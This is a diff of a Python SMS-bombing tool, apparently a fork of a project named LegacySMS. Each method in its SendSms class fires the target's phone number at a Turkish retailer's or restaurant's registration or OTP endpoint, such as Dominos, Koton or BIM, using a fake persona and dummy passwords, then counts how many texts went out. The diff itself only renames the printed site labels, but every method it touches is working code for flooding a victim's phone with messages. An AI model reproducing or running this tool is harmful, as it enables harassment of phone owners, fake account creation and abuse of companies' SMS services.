@@ -33,12 +33,12 @@ class SendSms():
             json={"countryCode": "90", "phoneNumber": self.phone}
             r = requests.post(url, headers=headers, json=json, timeout=6)
             if r.json()["processStatus"] == "Success":
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Gönderildi! {self.phone} --> api.kahvedunyasi.com")
+                print(f"{Fore.LIGHTGREEN_EX}[√] {Style.RESET_ALL}Gönderildi! {self.phone} --> KahveDünyası")
                 self.adet += 1
             else:
                 raise
         except:    
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Gönderilemedi! {self.phone} --> api.kahvedunyasi.com")
+            print(f"{Fore.LIGHTRED_EX}[X] {Style.RESET_ALL}Gönderilemedi! {self.phone} --> KahveDünyası")
         
 
     #wmf.com.tr
@@ -46,12 +46,12 @@ class SendSms():
         try:
             wmf = requests.post("https://www.wmf.com.tr/users/register/", data={"confirm": "true", "date_of_birth": "1956-03-01", "email": self.mail, "email_allowed": "true", "first_name": "Memati", "gender": "male", "last_name": "Bas", "password": "31ABC..abc31", "phone": f"0{self.phone}"}, timeout=6)
             if wmf.status_code == 202:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Gönderildi! {self.phone} --> wmf.com.tr")
+                print(f"{Fore.LIGHTGREEN_EX}[√] {Style.RESET_ALL}Gönderildi! {self.phone} --> WMF")
                 self.adet += 1   
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Gönderilemedi! {self.phone} --> wmf.com.tr")
+            print(f"{Fore.LIGHTRED_EX}[X] {Style.RESET_ALL}Gönderilemedi! {self.phone} --> WMF")
     
     
     #bim
@@ -59,12 +59,12 @@ class SendSms():
         try:
             bim = requests.post("https://bim.veesk.net:443/service/v1.0/account/login",  json={"phone": self.phone}, timeout=6)
             if bim.status_code == 200:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Gönderildi! {self.phone} --> bim.veesk.net")
+                print(f"{Fore.LIGHTGREEN_EX}[√] {Style.RESET_ALL}Gönderildi! {self.phone} --> BIM")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Gönderilemedi! {self.phone} --> bim.veesk.net")
+            print(f"{Fore.LIGHTRED_EX}[X] {Style.RESET_ALL}Gönderilemedi! {self.phone} --> BIM")
 
 
     #englishhome.com
@@ -75,12 +75,12 @@ class SendSms():
             json={"Phone": self.phone, "XID": ""}
             r = requests.post(url, headers=headers, json=json, timeout=6)
             if r.json()["isError"] == False:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Gönderildi! {self.phone} --> englishhome.com")
+                print(f"{Fore.LIGHTGREEN_EX}[√] {Style.RESET_ALL}Gönderildi! {self.phone} --> EnglishHome")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Gönderilemedi! {self.phone} --> englishhome.com")
+            print(f"{Fore.LIGHTRED_EX}[X] {Style.RESET_ALL}Gönderilemedi! {self.phone} --> EnglishHome")
           
 
     #suiste.com
@@ -91,12 +91,12 @@ class SendSms():
             data = {"action": "register", "device_id": "2390ED28-075E-465A-96DA-DFE8F84EB330", "full_name": "Memati Bas", "gsm": self.phone, "is_advertisement": "1", "is_contract": "1", "password": "31MeMaTi31"}
             r = requests.post(url, headers=headers, data=data, timeout=6)
             if r.json()["code"] == "common.success":
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Gönderildi! {self.phone} --> suiste.com")
+                print(f"{Fore.LIGHTGREEN_EX}[√] {Style.RESET_ALL}Gönderildi! {self.phone} --> Suİste/HemenGelsin")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Gönderilemedi! {self.phone} --> suiste.com")
+            print(f"{Fore.LIGHTRED_EX}[X] {Style.RESET_ALL}Gönderilemedi! {self.phone} --> Suİste/HemenGelsin")
                 
 #Bu Tool "https://github.com/s4m3dnotfound/LegacySMS" adresine aittir.
     
@@ -105,12 +105,12 @@ class SendSms():
         try:
             r = requests.post("https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com:443/api/auth/send-otp", json={"msisdn": f"90{self.phone}"}, timeout=6)
             if r.status_code == 200:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Gönderildi! {self.phone} --> 3uptzlakwi.execute-api.eu-west-1.amazonaws.com")
+                print(f"{Fore.LIGHTGREEN_EX}[√] {Style.RESET_ALL}Gönderildi! {self.phone} --> KimGBIster")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Gönderilemedi! {self.phone} --> 3uptzlakwi.execute-api.eu-west-1.amazonaws.com")
+            print(f"{Fore.LIGHTRED_EX}[X] {Style.RESET_ALL}Gönderilemedi! {self.phone} --> KimGBIster")
             
     
     #evidea.com
@@ -121,12 +121,12 @@ class SendSms():
             data = f"--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"first_name\"\r\n\r\nMemati\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"last_name\"\r\n\r\nBas\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"email\"\r\n\r\n{self.mail}\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"email_allowed\"\r\n\r\nfalse\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"sms_allowed\"\r\n\r\ntrue\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"password\"\r\n\r\n31ABC..abc31\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"phone\"\r\n\r\n0{self.phone}\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"confirm\"\r\n\r\ntrue\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi--\r\n"
             r = requests.post(url, headers=headers, data=data, timeout=6)      
             if r.status_code == 202:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Gönderildi! {self.phone} --> evidea.com")
+                print(f"{Fore.LIGHTGREEN_EX}[√] {Style.RESET_ALL}Gönderildi! {self.phone} --> Evidea")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Gönderilemedi! {self.phone} --> evidea.com") 
+            print(f"{Fore.LIGHTRED_EX}[X] {Style.RESET_ALL}Gönderilemedi! {self.phone} --> Evidea") 
 
 
     #345dijital.com
@@ -137,11 +137,11 @@ class SendSms():
             json={"email": "", "name": "Memati", "phoneNumber": f"+90{self.phone}", "surname": "Bas"}
             r = requests.post(url, headers=headers, json=json, timeout=6)
             if r.json()["error"] == "E-Posta veya telefon zaten kayıtlı!":
-                print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Gönderilemedi! {self.phone} --> api.345dijital.com")
+                print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Gönderilemedi! {self.phone} --> 345Dijital")
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Gönderildi! {self.phone} --> api.345dijital.com")
+            print(f"{Fore.LIGHTGREEN_EX}[√] {Style.RESET_ALL}Gönderildi! {self.phone} --> 345Dijital")
             self.adet += 1
 
 
@@ -153,12 +153,12 @@ class SendSms():
             json={"operationName": "GENERATE_OTP", "query": "mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) {\n  generateOtp(phone: $phone, challenge: $challenge, deviceUniqueId: $deviceUniqueId)\n}\n", "variables": {"challenge": "3d6f9ff9-86ce-4bf3-8ba9-4a85ca975e68", "deviceUniqueId": "720932D5-47BD-46CD-A4B8-086EC49F81AB", "phone": f"+90{self.phone}"}}
             r = requests.post(url, headers=headers, json=json, timeout=6)
             if r.json()["data"]["generateOtp"] == True:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Gönderildi! {self.phone} --> svc.apps.tiklagelsin.com")
+                print(f"{Fore.LIGHTGREEN_EX}[√] {Style.RESET_ALL}Gönderildi! {self.phone} --> TıklaGelsin")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Gönderilemedi! {self.phone} --> svc.apps.tiklagelsin.com")
+            print(f"{Fore.LIGHTRED_EX}[X] {Style.RESET_ALL}Gönderilemedi! {self.phone} --> TıklaGelsin")
 
 
     #naosstars.com
@@ -169,12 +169,12 @@ class SendSms():
             json={"telephone": f"+90{self.phone}", "type": "register"}
             r = requests.post(url, headers=headers, json=json, timeout=6)
             if r.status_code == 200:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Gönderildi! {self.phone} --> api.naosstars.com")
+                print(f"{Fore.LIGHTGREEN_EX}[√] {Style.RESET_ALL}Gönderildi! {self.phone} --> NAOS")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Gönderilemedi! {self.phone} --> api.naosstars.com")
+            print(f"{Fore.LIGHTRED_EX}[X] {Style.RESET_ALL}Gönderilemedi! {self.phone} --> NAOS")
 
 
     #koton.com
@@ -185,12 +185,12 @@ class SendSms():
             data = f"--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"first_name\"\r\n\r\nMemati\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"last_name\"\r\n\r\nBas\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"email\"\r\n\r\n{self.mail}\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"password\"\r\n\r\n31ABC..abc31\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"phone\"\r\n\r\n0{self.phone}\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"confirm\"\r\n\r\ntrue\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"sms_allowed\"\r\n\r\ntrue\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"email_allowed\"\r\n\r\ntrue\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"date_of_birth\"\r\n\r\n1993-07-02\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"call_allowed\"\r\n\r\ntrue\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"gender\"\r\n\r\n\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk--\r\n"
             r = requests.post(url, headers=headers, data=data, timeout=6)
             if r.status_code == 202:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Gönderildi! {self.phone} --> koton.com")
+                print(f"{Fore.LIGHTGREEN_EX}[√] {Style.RESET_ALL}Gönderildi! {self.phone} --> Koton")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Gönderilemedi! {self.phone} --> koton.com")
+            print(f"{Fore.LIGHTRED_EX}[X] {Style.RESET_ALL}Gönderilemedi! {self.phone} --> Koton")
 
 
     #hayatsu.com.tr
@@ -201,12 +201,12 @@ class SendSms():
             data = {"mobilePhoneNumber": self.phone, "actionType": "register"}
             r = requests.post(url, headers=headers, data=data, timeout=6)
             if r.json()["is_success"] == True:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Gönderildi! {self.phone} --> api.hayatsu.com.tr")
+                print(f"{Fore.LIGHTGREEN_EX}[√] {Style.RESET_ALL}Gönderildi! {self.phone} --> Hayatsu")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Gönderilemedi! {self.phone} --> api.hayatsu.com.tr")
+            print(f"{Fore.LIGHTRED_EX}[X] {Style.RESET_ALL}Gönderilemedi! {self.phone} --> Hayatsu")
 
 
     #hizliecza.com.tr
@@ -217,12 +217,12 @@ class SendSms():
             json={"otpOperationType": 1, "phoneNumber": f"+90{self.phone}"}
             r = requests.post(url, headers=headers, json=json, timeout=6)
             if r.status_code == 200:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Gönderildi! {self.phone} --> prod.hizliecza.net")
+                print(f"{Fore.LIGHTGREEN_EX}[√] {Style.RESET_ALL}Gönderildi! {self.phone} --> HızlıEcza")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Gönderilemedi! {self.phone} --> prod.hizliecza.net")
+            print(f"{Fore.LIGHTRED_EX}[X] {Style.RESET_ALL}Gönderilemedi! {self.phone} --> HızlıEcza")
 
 
     #metro-tr.com
@@ -233,12 +233,12 @@ class SendSms():
             json={"methodType": "2", "mobilePhoneNumber": self.phone}
             r = requests.post(url, headers=headers, json=json, timeout=6)
             if r.json()["status"] == "success":
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Gönderildi! {self.phone} --> mobile.metro-tr.com")
+                print(f"{Fore.LIGHTGREEN_EX}[√] {Style.RESET_ALL}Gönderildi! {self.phone} --> MetroMarket")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Gönderilemedi! {self.phone} --> mobile.metro-tr.com")
+            print(f"{Fore.LIGHTRED_EX}[X] {Style.RESET_ALL}Gönderilemedi! {self.phone} --> MetroMarket")
 
 
     #file.com.tr
@@ -249,12 +249,12 @@ class SendSms():
             json={"mobilePhoneNumber": f"90{self.phone}"}
             r = requests.post(url, headers=headers, json=json, timeout=6)
             if r.json()["responseType"] == "SUCCESS":
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Gönderildi! {self.phone} --> api.filemarket.com.tr")
+                print(f"{Fore.LIGHTGREEN_EX}[√] {Style.RESET_ALL}Gönderildi! {self.phone} --> FileMarket")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Gönderilemedi! {self.phone} --> api.filemarket.com.tr")
+            print(f"{Fore.LIGHTRED_EX}[X] {Style.RESET_ALL}Gönderilemedi! {self.phone} --> FileMarket")
 
 
     #komagene.com.tr
@@ -265,12 +265,12 @@ class SendSms():
             headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0", "Accept": "*/*", "Accept-Encoding": "gzip, deflate, br", "Referer": "https://www.komagene.com.tr/", "Anonymousclientid": "0dbf392b-ab10-48b3-5cda-31f3c19816e6", "Firmaid": "32", "X-Guatamala-Kirsallari": "@@b7c5EAAAACwZI8p8fLJ8p6nOq9kTLL+0GQ1wCB4VzTQSq0sekKeEdAoQGZZo+7fQw+IYp38V0I/4JUhQQvrq1NPw4mHZm68xgkb/rmJ3y67lFK/uc+uq", "Content-Type": "application/json", "Origin": "https://www.komagene.com.tr", "Dnt": "1", "Sec-Gpc": "1", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-site", "Priority": "u=0", "Te": "trailers", "Connection": "keep-alive"}
             r = requests.post(url=url, headers=headers, json=json, timeout=6)
             if r.json()["Success"] == True:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Gönderildi! {self.phone} --> gateway.komagene.com")
+                print(f"{Fore.LIGHTGREEN_EX}[√] {Style.RESET_ALL}Gönderildi! {self.phone} --> Komagene")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Gönderilemedi! {self.phone} --> gateway.komagene.com")
+            print(f"{Fore.LIGHTRED_EX}[X] {Style.RESET_ALL}Gönderilemedi! {self.phone} --> Komagene")
     
     
     #porty.tech
@@ -281,12 +281,12 @@ class SendSms():
             json={"job": "start_login", "phone": self.phone}
             r = requests.post(url=url, json=json, headers=headers, timeout=6)
             if r.json()["status"]== "success":
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Gönderildi! {self.phone} --> panel.porty.tech")
+                print(f"{Fore.LIGHTGREEN_EX}[√] {Style.RESET_ALL}Gönderildi! {self.phone} --> Porty")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Gönderilemedi! {self.phone} --> panel.porty.tech")
+            print(f"{Fore.LIGHTRED_EX}[X] {Style.RESET_ALL}Gönderilemedi! {self.phone} --> Porty")
 
 
     #yapp.com.tr
@@ -297,12 +297,12 @@ class SendSms():
             json={"app_version": "1.1.5", "code": "tr", "device_model": "iPhone8,5", "device_name": "Memati", "device_type": "I", "device_version": "15.8.3", "email": self.mail, "firstname": "Memati", "is_allow_to_communication": "1", "language_id": "2", "lastname": "Bas", "phone_number": self.phone, "sms_code": ""}
             r = requests.post(url=url, json=json, headers=headers, timeout=6)
             if r.status_code == 200:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Gönderildi! {self.phone} --> yapp.com.tr")
+                print(f"{Fore.LIGHTGREEN_EX}[√] {Style.RESET_ALL}Gönderildi! {self.phone} --> Yapp")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Gönderilemedi! {self.phone} --> yapp.com.tr")
+            print(f"{Fore.LIGHTRED_EX}[X] {Style.RESET_ALL}Gönderilemedi! {self.phone} --> Yapp")
 
 
     #dominos.com.tr
@@ -313,12 +313,12 @@ class SendSms():
             json={"email": self.mail, "isSure": False, "mobilePhone": self.phone}
             r = requests.post(url, headers=headers, json=json, timeout=6)
             if r.json()["isSuccess"] == True:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Gönderildi! {self.phone} --> frontend.dominos.com.tr")
+                print(f"{Fore.LIGHTGREEN_EX}[√] {Style.RESET_ALL}Gönderildi! {self.phone} --> Dominos")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Gönderilemedi! {self.phone} --> frontend.dominos.com.tr")
+            print(f"{Fore.LIGHTRED_EX}[X] {Style.RESET_ALL}Gönderilemedi! {self.phone} --> Dominos")
 
 
     #bodrum.bel.tr
@@ -329,12 +329,12 @@ class SendSms():
             json={"gsm": "+90"+self.phone, "source": "orwi"}
             r = requests.post(url, headers=headers, json=json, timeout=6)
             if r.status_code == 200:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Gönderildi! {self.phone} --> gandalf.orwi.app")
+                print(f"{Fore.LIGHTGREEN_EX}[√] {Style.RESET_ALL}Gönderildi! {self.phone} --> BodrumGıda")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Gönderilemedi! {self.phone} --> gandalf.orwi.app")     
+            print(f"{Fore.LIGHTRED_EX}[X] {Style.RESET_ALL}Gönderilemedi! {self.phone} --> BodrumGıda")     
 
     
     #kofteciyusuf.com
@@ -345,12 +345,12 @@ class SendSms():
             json={"FireBaseCihazKey": None, "FirmaId": 82, "GuvenlikKodu": None, "Telefon": self.phone}
             r = requests.post(url, headers=headers, json=json, timeout=6)
             if r.json()["Success"] == True:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Gönderildi! {self.phone} --> gateway.poskofteciyusuf.com")
+                print(f"{Fore.LIGHTGREEN_EX}[√] {Style.RESET_ALL}Gönderildi! {self.phone} --> KöfteciYusuf")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Gönderilemedi! {self.phone} --> gateway.poskofteciyusuf.com")
+            print(f"{Fore.LIGHTRED_EX}[X] {Style.RESET_ALL}Gönderilemedi! {self.phone} --> KöfteciYusuf")
 
 
     #orwi.app
@@ -361,11 +361,11 @@ class SendSms():
             json={"gsm": f"+90{self.phone}", "source": "orwi"}
             r = requests.post(url, headers=headers, json=json, timeout=6)
             if r.status_code == 200:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Gönderildi! {self.phone} --> gandalf.orwi.app")
+                print(f"{Fore.LIGHTGREEN_EX}[√] {Style.RESET_ALL}Gönderildi! {self.phone} --> Orwi")
                 self.adet += 1
             else:
                 raise
         except:
-            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Gönderilemedi! {self.phone} --> gandalf.orwi.app")
+            print(f"{Fore.LIGHTRED_EX}[X] {Style.RESET_ALL}Gönderilemedi! {self.phone} --> Orwi")
 
 #Bu Tool "https://github.com/s4m3dnotfound/LegacySMS" adresine aittir.
